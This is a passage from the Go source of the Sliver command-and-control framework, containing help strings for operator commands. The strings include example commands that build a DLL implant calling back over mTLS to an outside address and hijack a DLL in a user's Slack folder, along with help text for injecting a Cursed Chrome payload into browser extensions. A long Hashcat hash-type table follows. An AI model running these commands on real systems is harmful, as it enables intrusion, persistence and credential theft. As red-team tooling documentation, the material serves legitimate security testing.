profiles new --format shared --mtls 1.2.3.4:1234 --profile-name dll --run-at-load
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll

# Use a local DLL as the reference DLL
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /tmp/msasn1.dll.orig --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
`

	getPrivsHelp = `[[.Bold]]Command:[[.Normal]] getprivs
[[.Bold]]About:[[.Normal]] Get privilege information for the current process (Windows only).
`

	cursedChromeHelp = `[[.Bold]]Command:[[.Normal]] cursed chrome
[[.Bold]]About:[[.Normal]] Injects a Cursed Chrome payload into an existing Chrome extension.

If no extension is specified, Sliver will enumerate all installed extensions, extract their
permissions and determine a valid target for injection. For Cursed Chrome to work properly
the target extension must have either of these two sets of permissions:

1. "webRequest" "webRequestBlocking" "<all_urls>" 
2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*" 

More information: https://github.com/mandatoryprogrammer/CursedChrome
`

	buildersHelp = `[[.Bold]]Command:[[.Normal]] builders
[[.Bold]]About:[[.Normal]] Lists external builders currently registered with the server.

External builders allow the Sliver server offload implant builds onto external machines.
For more information: https://github.com/BishopFox/sliver/wiki/External-Builders
`

	credsHelp = `[[.Bold]]Command:[[.Normal]] creds
[[.Bold]]About:[[.Normal]] Manage credentials database.
`

	credsAddHelp = `[[.Bold]]Command:[[.Normal]] creds add
[[.Bold]]About:[[.Normal]] Add a credential to the database

[[.Bold]]Hash Types:[[.Normal]]
Sliver uses the same hash identifiers as Hashcat (use the #):

    # | Name                                                       | Category
======+============================================================+======================================
  900 | MD4                                                        | Raw Hash
    0 | MD5                                                        | Raw Hash
  100 | SHA1                                                       | Raw Hash
 1300 | SHA2-224                                                   | Raw Hash
 1400 | SHA2-256                                                   | Raw Hash
10800 | SHA2-384                                                   | Raw Hash
 1700 | SHA2-512                                                   | Raw Hash
17300 | SHA3-224                                                   | Raw Hash
17400 | SHA3-256                                                   | Raw Hash
17500 | SHA3-384                                                   | Raw Hash
17600 | SHA3-512                                                   | Raw Hash
 6000 | RIPEMD-160                                                 | Raw Hash
  600 | BLAKE2b-512                                                | Raw Hash
11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
 6900 | GOST R 34.11-94                                            | Raw Hash
17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                       | Raw Hash
 5100 | Half MD5                                                   | Raw Hash
17700 | Keccak-224                                                 | Raw Hash
17800 | Keccak-256                                                 | Raw Hash
17900 | Keccak-384                                                 | Raw Hash
18000 | Keccak-512                                                 | Raw Hash
 6100 | Whirlpool                                                  | Raw Hash
10100 | SipHash                                                    | Raw Hash
   70 | md5(utf16le($pass))                                        | Raw Hash
  170 | sha1(utf16le($pass))                                       | Raw Hash
 1470 | sha256(utf16le($pass))                                     | Raw Hash
10870 | sha384(utf16le($pass))                                     | Raw Hash
 1770 | sha512(utf16le($pass))                                     | Raw Hash
  610 | BLAKE2b-512($pass.$salt)                                   | Raw Hash salted and/or iterated
  620 | BLAKE2b-512($salt.$pass)                                   | Raw Hash salted and/or iterated
   10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
   20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
 3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
 3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
 4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
 4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
   40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
 2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
 3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
 3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
 4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
 4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
 4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
  110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
  120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
 4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
 4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
  140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
19300 | sha1($salt1.$pass.$salt2)                                  | Raw Hash salted and/or iterated
14400 | sha1(CX)                                                   | Raw Hash salted and/or iterated
 4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
 4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
 4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
 4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
 5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
  130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
 1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
 1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
 1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
 1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
10810 | sha384($pass.$salt)                                        | Raw Hash salted and/or iterated
10820 | sha384($salt.$pass)                                        | Raw Hash salted and/or iterated
10840 | sha384($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
10830 | sha384(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
 1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
 1720 | sha512($salt.$pass)                                        | Raw Hash salted and/or iterated
 1740 | sha512($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
 1730 | sha512(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
   60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
  150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
  160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
 1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
 1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
 1750 | HMAC-SHA512 (key = $pass)                                  | Raw Hash authenticated
 1760 | HMAC-SHA512 (key = $salt)                                  | Raw Hash authenticated
11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
11850 | HMAC-Streebog-512 (key = $pass), big-endian                | Raw Hash authenticated
11860 | HMAC-Streebog-512 (key = $salt), big-endian                | Raw Hash authenticated
28700 | Amazon AWS4-HMAC-SHA256                                    | Raw Hash authenticated
11500 | CRC32                                                      | Raw Checksum
27900 | CRC32C                                                     | Raw Checksum
28000 | CRC64Jones                                                 | Raw Checksum
18700 | Java Object hashCode()                                     | Raw Checksum
25700 | MurmurHash                                                 | Raw Checksum
27800 | MurmurHash3                                                | Raw Checksum
14100 | 3DES (PT = $salt, key = $pass)                             | Raw Cipher, Known-plaintext attack
14000 | DES (PT = $salt, key = $pass)                              | Raw Cipher, Known-plaintext attack
26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
15400 | ChaCha20                                                   | Raw Cipher, Known-plaintext attack
14500 | Linux Kernel Crypto API (2.4)                              | Raw Cipher, Known-plaintext attack
14900 | Skip32 (PT = $salt, key = $pass)                           | Raw Cipher, Known-plaintext attack
11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
12000 | PBKDF2-HMAC-SHA1                                           | Generic KDF
10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
12100 | PBKDF2-HMAC-SHA512                                         | Generic KDF
 8900 | scrypt                                                     | Generic KDF
  400 | phpass                                                     | Generic KDF
16100 | TACACS+                                                    | Network Protocol
11400 | SIP digest authentication (MD5)                            | Network Protocol
 5300 | IKE-PSK MD5                                                | Network Protocol
 5400 | IKE-PSK SHA1                                               | Network Protocol
25100 | SNMPv3 HMAC-MD5-96                                         | Network Protocol
25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                            | Network Protocol
25200 | SNMPv3 HMAC-SHA1-96                                        | Network Protocol
26700 | SNMPv3 HMAC-SHA224-128                                     | Network Protocol
26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
26900 | SNMPv3 HMAC-SHA384-256                                     | Network Protocol
27300 | SNMPv3 HMAC-SHA512-384                                     | Network Protocol
 2500 | WPA-EAPOL-PBKDF2                                           | Network Protocol
 2501 | WPA-EAPOL-PMK                                              | Network Protocol
22000 | WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol
16800 | WPA-PMKID-PBKDF2                                           | Network Protocol
16801 | WPA-PMKID-PMK                                              | Network Protocol
 7300 | IPMI2 RAKP HMAC-SHA1                                       | Network Protocol
10200 | CRAM-MD5                                                   | Network Protocol
16500 | JWT (JSON Web Token)                                       | Network Protocol
29200 | Radmin3                                                    | Network Protocol
19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
 5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
 5600 | NetNTLMv2                                                  | Network Protocol
27100 | NetNTLMv2 (NT)                                             | Network Protocol
29100 | Flask Session Cookie ($salt.$salt.$pass)                   | Network Protocol
 4800 | iSCSI CHAP authentication, MD5(CHAP)                       | Network Protocol
 8500 | RACF                                                       | Operating System
 6300 | AIX {smd5}                                                 | Operating System
 6700 | AIX {ssha1}                                                | Operating System
 6400 | AIX {ssha256}                                              | Operating System
 6500 | AIX {ssha512}                                              | Operating System
 3000 | LM                                                         | Operating System
19000 | QNX /etc/shadow (MD5)                                      | Operating System
19100 | QNX /etc/shadow (SHA256)                                   | Operating System
19200 | QNX /etc/shadow (SHA512)                                   | Operating System
15300 | DPAPI masterkey file v1 (context 1 and 2)                  | Operating System
15310 | DPAPI masterkey file v1 (context 3)                        | Operating System
15900 | DPAPI masterkey file v2 (context 1 and 2)                  | Operating System
15910 | DPAPI masterkey file v2 (context 3)                        | Operating System
 7200 | GRUB 2                                                     | Operating System
12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
12400 | BSDi Crypt, Extended DES                                   | Operating System
 1000 | NTLM                                                       | Operating System
 9900 | Radmin2                                                    | Operating System
 5800 | Samsung Android Password/PIN                               | Operating System
28100 | Windows Hello PIN/Password                                 | Operating System
13800 | Windows Phone 8+ PIN/password                              | Operating System
 2410 | Cisco-ASA MD5                                              | Operating System
 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
 9300 | Cisco-IOS $9$ (scrypt)                                     | Operating System
 5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
 2400 | Cisco-PIX MD5                                              | Operating System
 8100 | Citrix NetScaler (SHA1)                                    | Operating System
22200 | Citrix NetScaler (SHA512)                                  | Operating System
 1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2             | Operating System
 7000 | FortiGate (FortiOS)                                        | Operating System
26300 | FortiGate256 (FortiOS256)                                  | Operating System
  125 | ArubaOS                                                    | Operating System
  501 | Juniper IVE                                                | Operating System
   22 | Juniper NetScreen/SSG (ScreenOS)                           | Operating System
15100 | Juniper/NetBSD sha1crypt                                   | Operating System
26500 | iPhone passcode (UID key + System Keybag)                  | Operating System
  122 | macOS v10.4, macOS v10.5, macOS v10.6                      | Operating System
 1722 | macOS v10.7                                                | Operating System
 7100 | macOS v10.8+ (PBKDF2-SHA512)                               | Operating System
 3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System
 1500 | descrypt, DES (Unix), Traditional DES                      | Operating System
29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
 7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
 1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
24600 | SQLCipher                                                  | Database Server
  131 | MSSQL (2000)                                               | Database Server
  132 | MSSQL (2005)                                               | Database Server
 1731 | MSSQL (2012, 2014)                                         | Database Server
24100 | MongoDB ServerKey SCRAM-SHA-1                              | Database Server
24200 | MongoDB ServerKey SCRAM-SHA-256                            | Database Server
   12 | PostgreSQL                                                 | Database Server
11100 | PostgreSQL CRAM (MD5)                                      | Database Server
28600 | PostgreSQL SCRAM-SHA-256                                   | Database Server
 3100 | Oracle H: Type (Oracle 7+)                                 | Database Server
  112 | Oracle S: Type (Oracle 11+)                                | Database Server
12300 | Oracle T: Type (Oracle 12+)                                | Database Server
 7401 | MySQL $A$ (sha256crypt)                                    | Database Server
11200 | MySQL CRAM (SHA1)                                          | Database Server
  200 | MySQL323                                                   | Database Server
  300 | MySQL4.1/MySQL5                                            | Database Server
 8000 | Sybase ASE                                                 | Database Server
 8300 | DNSSEC (NSEC3)                                             | FTP, HTTP, SMTP, LDAP Server
25900 | KNX IP Secure - Device Authentication Code                 | FTP, HTTP, SMTP, LDAP Server
16400 | CRAM-MD5 Dovecot                                           | FTP, HTTP, SMTP, LDAP Server
 1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
 1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
24900 | Dahua Authentication MD5                                   | FTP, HTTP, SMTP, LDAP Server
10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
15000 | FileZilla Server >= 0.9.55                                 | FTP, HTTP, SMTP, LDAP Server
12600 | ColdFusion 10+                                             | FTP, HTTP, SMTP, LDAP Server
 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
  141 | Episerver 6.x < .NET 4                                     | FTP, HTTP, SMTP, LDAP Server
 1441 | Episerver 6.x >= .NET 4                                    | FTP, HTTP, SMTP, LDAP Server
 1421 | hMailServer                                                | FTP, HTTP, SMTP, LDAP Server
  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                   | FTP, HTTP, SMTP, LDAP Server
  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
 7700 | SAP CODVN B (BCODE)                                        | Enterprise Application Software (EAS)
 7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                    | Enterprise Application Software (EAS)
 7800 | SAP CODVN F/G (PASSCODE)                                   | Enterprise Application Software (EAS)
 7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE               | Enterprise Application Software (EAS)
10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
  133 | PeopleSoft                                                 | Enterprise Application Software (EAS)
13500 | PeopleSoft PS_TOKEN                                        | Enterprise Application Software (EAS)
21500 | SolarWinds Orion                                           | Enterprise Application Software (EAS)
21501 | SolarWinds Orion v2                                        | Enterprise Application Software (EAS)
   24 | SolarWinds Serv-U                                          | Enterprise Application Software (EAS)
 8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
 8700 | Lotus Notes/Domino 6                                       | Enterprise Application Software (EAS)
 9100 | Lotus Notes/Domino 8                                       | Enterprise Application Software (EAS)
26200 | OpenEdge Progress Encode                                   | Enterprise Application Software (EAS)
20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
 4711 | Huawei sha1(md5($pass).$salt)                              | Enterprise Application Software (EAS)
20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                | Full-Disk Encryption (FDE)
14600 | LUKS v1 (legacy)                                           | Full-Disk Encryption (FDE)
29541 | LUKS v1 RIPEMD-160 + AES                                   | Full-Disk Encryption (FDE)
29542 | LUKS v1 RIPEMD-160 + Serpent                               | Full-Disk Encryption (FDE)
29543 | LUKS v1 RIPEMD-160 + Twofish                               | Full-Disk Encryption (FDE)
29511 | LUKS v1 SHA-1 + AES                                        | Full-Disk Encryption (FDE)
29512 | LUKS v1 SHA-1 + Serpent                                    | Full-Disk Encryption (FDE)
29513 | LUKS v1 SHA-1 + Twofish                                    | Full-Disk Encryption (FDE)
29521 | LUKS v1 SHA-256 + AES                                      | Full-Disk Encryption (FDE)
29522 | LUKS v1 SHA-256 + Serpent                                  | Full-Disk Encryption (FDE)
29523 | LUKS v1 SHA-256 + Twofish                                  | Full-Disk Encryption (FDE)
29531 | LUKS v1 SHA-512 + AES                                      | Full-Disk Encryption (FDE)
29532 | LUKS v1 SHA-512 + Serpent                                  | Full-Disk Encryption (FDE)
29533 | LUKS v1 SHA-512 + Twofish                                  | Full-Disk Encryption (FDE)
13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
29411 | VeraCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
29421 | VeraCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
29422 | VeraCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
29423 | VeraCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
29471 | VeraCrypt Streebog-512 + XTS 512 bit                       | Full-Disk Encryption (FDE)
29472 | VeraCrypt Streebog-512 + XTS 1024 bit                      | Full-Disk Encryption (FDE)
29473 | VeraCrypt Streebog-512 + XTS 1536 bit                      | Full-Disk Encryption (FDE)
29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode           | Full-Disk Encryption (FDE)
29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode          | Full-Disk Encryption (FDE)
29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode          | Full-Disk Encryption (FDE)
13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
29431 | VeraCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
29432 | VeraCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
29433 | VeraCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
23900 | BestCrypt v3 Volume Encryption                             | Full-Disk Encryption (FDE)
16700 | FileVault 2                                                | Full-Disk Encryption (FDE)
27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)              | Full-Disk Encryption (FDE)
27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)              | Full-Disk Encryption (FDE)
20011 | DiskCryptor SHA512 + XTS 512 bit                           | Full-Disk Encryption (FDE)
20012 | DiskCryptor SHA512 + XTS 1024 bit                          | Full-Disk Encryption (FDE)
20013 | DiskCryptor SHA512 + XTS 1536 bit                          | Full-Disk Encryption (FDE)
22100 | BitLocker                                                  | Full-Disk Encryption (FDE)
12900 | Android FDE (Samsung DEK)                                  | Full-Disk Encryption (FDE)
 8800 | Android FDE <= 4.3                                         | Full-Disk Encryption (FDE)
18300 | Apple File System (APFS)                                   | Full-Disk Encryption (FDE)
 6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
 6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
 6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
 6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
 6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
 6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
29311 | TrueCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
 6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
 6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
 6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
29321 | TrueCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
29322 | TrueCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
29323 | TrueCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
 6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
 6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
 6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
29331 | TrueCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
29332 | TrueCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
29333 | TrueCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
12200 | eCryptfs                                                   | Full-Disk Encryption (FDE)
10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                              | Document
10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                 | Document
10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                 | Document
10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                              | Document
25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
10600 | PDF 1.7 Level 3 (Acrobat 9)                                | Document
10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                          | Document
 9400 | MS Office 2007                                             | Document
 9500 | MS Office 2010                                             | Document
 9600 | MS Office 2013                                             | Document
25300 | MS Office 2016 - SheetProtection                           | Document
 9700 | MS Office <= 2003 $0/$1, MD5 + RC4                         | Document
 9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1            | Document
 9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2            | Document
 9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1              | Document
 9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2              | Document
 9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                        | Document
18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)              | Document
18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)           | Document
16200 | Apple Secure Notes                                         | Document
23300 | Apple iWork                                                | Document
 6600 | 1Password, agilekeychain                                   | Password Manager
 8200 | 1Password, cloudkeychain                                   | Password Manager
 9000 | Password Safe v2                                           | Password Manager
 5200 | Password Safe v3                                           | Password Manager
 6800 | LastPass + LastPass sniffed                                | Password Manager
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only | Password Manager
23400 | Bitwarden                                                  | Password Manager
16900 | Ansible Vault                                              | Password Manager
26000 | Mozilla key3.db                                            | Password Manager
26100 | Mozilla key4.db                                            | Password Manager
23100 | Apple Keychain                                             | Password Manager
11600 | 7-Zip                                                      | Archive
12500 | RAR3-hp                                                    | Archive
23700 | RAR3-p (Uncompressed)                                      | Archive
13000 | RAR5                                                       | Archive
17220 | PKZIP (Compressed Multi-File)                              | Archive
17200 | PKZIP (Compressed)                                         | Archive
17225 | PKZIP (Mixed Multi-File)                                   | Archive
17230 | PKZIP (Mixed Multi-File Checksum-Only)                     | Archive
17210 | PKZIP (Uncompressed)                                       | Archive
20500 | PKZIP Master Key                                           | Archive
20510 | PKZIP Master Key (6 byte optimization)                     | Archive
23001 | SecureZIP AES-128                                          | Archive
23002 | SecureZIP AES-192                                          | Archive
